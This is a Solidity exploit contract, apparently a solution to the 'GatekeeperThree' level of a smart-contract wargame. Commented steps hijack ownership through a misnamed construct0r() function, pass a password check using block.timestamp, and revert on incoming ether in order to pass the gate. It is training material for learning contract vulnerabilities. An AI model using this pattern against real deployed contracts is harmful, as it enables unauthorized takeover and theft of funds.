// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./GatekeeperThree.sol";

contract AttackGatekeeperThree {
    GatekeeperThree victimContract;

    // 1. Attacker creates `AttackGatekeeperThree` contract providing the address of the `GatekeeperThree` contract.
    constructor(address _victimContract) {
        victimContract = GatekeeperThree(payable(_victimContract));
    }

    function attack() public payable {
        // 2. Attacker calls the `attack()` function in the `AttackGatekeeperThree` contract that is invoking `construct0r()` on `GatekeeperThree` contract making him the owner of the `GatekeeperThree` contract.

        victimContract.construct0r();

        // 3. Attacker calls `createTrick()` by calling the `attack()` function to get deploy a new `SimpleTrick` contract.
        victimContract.createTrick();

        // 4. Attacker runs the `getAllowance()` by calling the `attack()` function with the password
        victimContract.getAllowance(block.timestamp);

        // 5. Attacker sends `0.0011 ether` to the `GatekeeperThree` contract address by calling the `attack()` function, rejecting any incoming ETH.
        (bool sent, ) = payable(victimContract).call{value: msg.value}("");

        require(sent, "Fail to send ether");

        // 6. Attacker becomes `entrant` by calling `enter` function.
        victimContract.enter();
    }

    // 5. Attacker sends `0.0011 ether` to the `GatekeeperThree` contract address by calling the `attack()` function, rejecting any incoming ETH.
    receive() external payable {
        revert("Fail to send to this contract!");
    }
}
